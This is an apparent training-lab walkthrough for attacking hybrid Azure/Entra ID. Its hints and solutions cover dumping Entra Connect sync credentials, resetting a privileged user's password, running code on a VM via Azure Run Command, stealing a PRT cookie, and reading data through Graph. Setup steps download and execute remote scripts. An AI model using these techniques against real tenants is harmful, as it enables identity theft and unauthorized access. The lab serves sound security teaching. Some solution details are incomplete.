creds of an SP -> azure run command -> vm that has user logged on -> steal user prt ->


# Preparations
1. RDP login to DC VM using the **YOURDOMAIN\rootuser**
then, run the following powershell script as admin:
    ```powershell
    # when asked, login using the ENTRA CREDS (!)
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shackcrack007/hybrid-attacks-course-template/refs/heads/main/labs%20(for%20course%20sessions%2C%20not%20part%20of%20setup)/lab-4-full-attack-flow/lab4PreparationScript.ps1" -OutFile "C:\\lab4PreparationScript.ps1"; `
    & "C:\\lab4PreparationScript.ps1"
    ```
2. RDP login to Win11 VM using the **YOURDOMAIN\user1**
then, , run the following powershell script as admin:
    ```powershell
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shackcrack007/hybrid-attacks-course-template/refs/heads/main/labs%20(for%20course%20sessions%2C%20not%20part%20of%20setup)/lab-4-full-attack-flow/lab4Win11VmPrepScript.ps1" -OutFile "C:\\lab4Win11VmPrepScript.ps1"; `
        & "C:\\lab4Win11VmPrepScript.ps1"
    ```
keep this window open in the background - you're not allowed to use it from now on.

# Instructions
1. Your goal is to find the secret.txt file 
2. forget everything you knew: from this point on you DON'T know what the admin password is (i.e. what's the password of 'user1')
3. DO NOT password reset or silver ticket (seamless sso) "user1"
3. the only thing you have is the RDP session on the DC. Good luck! 

# Hints

<details>
    <summary><b>First hint: where the secret.txt file isn't stored</b></summary>

    The file isn't on a VM
</details>


<details>
    <summary><b>Entire attack path hint (use as last resort)</b></summary>

    1. pass reset: DC vm -> reset pass of "user2" using Entra Sync credentials

    2. login to Azure as that user using your browser

    3. azure run command on Win11 VM (the VM that has user1 logged on)

    4. Steal user1 PRT Cookie by running powershell script from the Run Command extension on the Azure portal 

    5. Use PRT Cookie to get access token and authenticate using PowerShell to MS Graph API read secret.txt from storage account
</details>



## Step 1

<details>
<summary><b>Hint 1</b></summary>
    
    1. Find a way to compromise a synced user in order to jump to the cloud

    2. Recon for roles / permissions to see which user you want to compromise

    3. it's not "user1"...
</details>


<details>
    <summary><b>Hint 2</b></summary>
    
    Abuse the Entra Connect password reset feature using AADInternals
</details>



<details>
<summary><b>Solution</b></summary>
    
```powershell
Import-Module AADInternals
Get-AADIntSyncCredentials
```

Login using dumped Sync_XX account:
```powershell
# Prompt for credentials and retrieve & store access token to cache
# Enter your dumped Sync_XX account creds!
$tenantId = "YOUR_TENANT_ID"
$at = Get-AADIntAccessTokenForAADGraph -SaveToCache
Connect-AzureAD -AadAccessToken $at -TenantId $tenantId -AccountId "1b730954-1685-4b74-9bfd-dac224a7b894" # "Azure Active Directory PowerShell" app id
```

Enumerate users:
```powershell
# list on-premise, synced users with their roles
$onpremSyncedUsers = Get-AzureADUser -All $true | Where-Object { 
    $_.OnPremisesSecurityIdentifier -ne $null 
} 
$onpremSyncedUsers | ForEach-Object { 
    $user = $_; 
    Get-AzureADDirectoryRole | ForEach-Object { 
        $role = $_;
        Get-AzureADDirectoryRoleMember -ObjectId $role.ObjectId | Where-Object { $_.ObjectId -eq $user.ObjectId } | Select-Object @{Name='UserPrincipalName';Expression={$user.UserPrincipalName}}, @{Name='OnPremisesSecurityIdentifier';Expression={$user.OnPremisesSecurityIdentifier}}, @{Name='ImmutableId';Expression={$user.ImmutableId}}, @{Name='Role';Expression={$role.DisplayName}} 
    } 
} | Format-Table -Wrap -AutoSize
```
Target user2, as he holds a privileged role.. 

Reset the victim user's Entra password:
```powershell
Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS" -Verbose
```
</details>


## Step 2

<details>
    <summary><b>Hint 1</b></summary>
    
    Login to Azure as that user and see what you have access to
</details>

<details>
    <summary><b>Hint 2</b></summary>

    You can find the virtual machine Win11 and using the Run Command extension execute PowerShell script on it
</details>


<details>
    <summary><b>Hint 3</b></summary>
    
    Use this ability to get a PRT Cookie so you can impersonate as that user and steal its identity and permissions
</details>

<details>
    <summary><b>Hint 4</b></summary>

    user1 is a part of the company's red team, he continuously, on a regular basis, runs scripts from his Desktop folder to map their Entra tenant attack surface. Use that to your advantage.
</details>

<details>
<summary><b>Solution</b></summary>

user1 uses roadrecon to map attack surfaces in his company's attack surface, the script is executed on a regular basis.
as we learned, roadrecon writes a file with the access token called "", we can take that access token and steal it!
1. Get the logged in user's access token: run the following command from the Run Command Window in the Azure portal:

```powershell
# Get the nonce first
roadrecon auth --prt-init 

# Get a new PRT Cookie
.\ROADtoken.exe <nonce> 

# this will AUTOMATICALLY open a browser and log in as that user (!)
roadrecon auth -r msgraph -c "1950a258-227b-4e31-a9cf-717495945fc2" --prt-cookie $prtToken 
 <eyJh... PRT COOKIE>

```
</details>


### Step 3 Hint
### Step 3 Solution

```powershell
$at = "eyJ...."
$secureAt = ConvertTo-SecureString -String $at -AsPlainText -Force
Connect-MgGraph -AccessToken $secureAt
Get-MgUser
```

### Bonus: 
Go back to the beginning, and try steal user2 using silver ticket (Seamless SSO) instead of password reset


## Don't forget
Once done, delete the lab resource groups to clean up the resources